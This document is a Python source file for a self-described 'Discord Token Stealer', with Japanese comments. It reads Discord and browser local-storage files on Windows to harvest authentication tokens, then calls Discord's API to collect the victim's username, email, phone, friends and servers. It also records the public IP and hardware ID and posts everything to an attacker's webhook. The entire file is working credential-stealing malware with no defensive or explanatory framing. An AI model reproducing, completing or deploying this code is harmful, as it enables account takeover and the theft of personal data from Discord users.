import os
import requests
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE

ROAMING = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")

WEBHOOK = ""

PATHS = {
    "discord": ROAMING + r"\discord",
    "discordPTB": ROAMING + r"\discordptb",
    "discordCanary": ROAMING + r"\discordcanary",
    'Google Chrome': LOCAL + r'\Google\Chrome\User Data\Default',
    'Opera': ROAMING + r'\Opera Software\Opera Stable',
    'Brave': LOCAL + r'\BraveSoftware\Brave-Browser\User Data\Default',
    'Yandex': LOCAL + r'\Yandex\YandexBrowser\User Data\Default'
}


def getToken(path):
    path += r"\Local Storage\leveldb"
    tokens = []
    # levelDBの中身を取得する

    try:
        for file_name in os.listdir(path):
            # .log .ldbじゃなかったらスキップ
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue
            # lineに空白を削除し、1行にまとめた.log .ldbのそれぞれのデータを取得
            for line in [x.strip() for x in open(fr"{path}\{file_name}", errors="ignore").readlines()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    except:
        return tokens.append(None)


def getIp():
    ip = None
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip


def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeaders(token))).read().decode())
    except:
        pass


def getGuilds(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/guilds",
                                     headers=getHeaders(token))).read().decode())
    except:
        pass


def getHeaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token=None):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeaders(token))).read().decode())
    except:
        pass


def main():
    tokens = []
    for path in PATHS.items():
        path = path[1]
        if not os.path.exists(path):
            continue
        for token in getToken(path):
            if token in tokens:
                continue
            tokens.append(token)
            if not token.startswith("mfa."):
                continue
            if not getUserData(token):
                continue
            userData = getUserData(token)
            userName = userData["username"] + "#" + userData["discriminator"]
            userLocale = userData["locale"]
            userEmail = userData["email"]
            userPhone = userData["phone"]
            userFriends = []
            for friend in getFriends(token):
                userFriends.append(friend["user"]["username"])
            userIp = getIp()
            userGuilds = []
            for guild in getGuilds(token):
                userGuilds.append(guild["name"])
            userHwid = gethwid()
            # print(userData)
            # print(userName)
            # print(userLocale)
            # print(userEmail)
            # print(userPhone)

            try:
                headers = {
                    'cookie': "__cfduid=d2409c5e9d9980aef1acdebffa88bc2831613788822",
                    'Content-Type': "application/json"
                }
                embed = {
                    "username": "Discord Token Stealer",
                    "avatar_url": "https://i.imgur.com/4M34hi2.png",
                    "embeds": [
                        {
                            "author": {
                                "name": "Discord Stealer",
                                "url": "https://www.reddit.com/r/cats/",
                                "icon_url": "https://i.imgur.com/R66g1Pe.jpg"
                            },
                            "title": userName,
                            "color": 15258703,
                            "fields": [
                                {
                                    "name": "tokens",
                                    "value": f"{token}",
                                    "inline": False
                                },
                                {
                                    "name": "locale",
                                    "value": f"{userLocale}",
                                    "inline": True
                                },
                                {
                                    "name": "emails",
                                    "value": f"{userEmail}",
                                    "inline": True
                                },
                                {
                                    "name": "phone",
                                    "value": f"{userPhone}",
                                    "inline": True
                                },
                                {
                                    "name": "friends",
                                    "value": f"{'/'.join(userFriends)}",
                                    "inline": False
                                },
                                {
                                    "name": "guilds",
                                    "value": f"{'/'.join(userGuilds)}",
                                    "inline": False
                                },
                                {
                                    "name": "IP",
                                    "value": f"{userIp}",
                                    "inline": True
                                },
                                {
                                    "name": "HWID",
                                    "value": f"{userHwid}",
                                    "inline": True
                                },
                            ],
                            "footer": {
                                "text": "Token was stolen by Discord Stealer",
                                "icon_url": "https://i.imgur.com/fKL31aD.jpg"
                            }
                        }
                    ]
                }

                requests.post(WEBHOOK, dumps(embed), headers=getHeaders())
            except:
                pass


main()
